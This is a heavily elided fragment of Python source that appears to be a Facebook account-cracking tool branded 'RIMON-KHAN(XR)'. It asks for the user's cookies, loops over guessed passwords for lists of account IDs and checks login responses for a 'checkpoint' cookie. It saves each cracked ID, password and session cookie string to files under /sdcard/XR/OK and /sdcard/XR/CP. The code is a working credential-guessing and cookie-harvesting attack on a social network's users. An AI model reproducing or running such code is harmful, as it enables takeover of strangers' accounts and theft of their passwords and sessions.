...
def login_lagi334():
	try:
		...
		cookie=input(f'  [{m}•{m}] Invite Cookies :{kk} ')
	...
	while True:
		try:
			...
			try:
				...
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup public ","")
...
#-------------[ PENGATURAN-IDZ ]---------------#
def setting():
	cetak(nel('\t[bold cyan]         • • [/bold cyan]'))
	print('') 
	cetak(nel('[bold green]➣1. Old id\n➣2.  New id \n➣3. Random id'))
	print('')
	hu = input('➥➥➣Choice : ')
	if hu in ['1','01']:
...
#	else:
#		taplikasi.append('no')
	pwplus=input('➣Password Manual/depault( m/d ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				cetak(nel('[green]      🎀 RIMON-KHAN(XR) 🎀[green]')) 
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				cetak(nel('[purple]      RIMON-KHAN(XR)[purple]')) 
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='XR CP'))
					open('/sdcard/XR/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/XR/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='XR OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]XR-OK[/bold green]'))
					ok+=1
					break
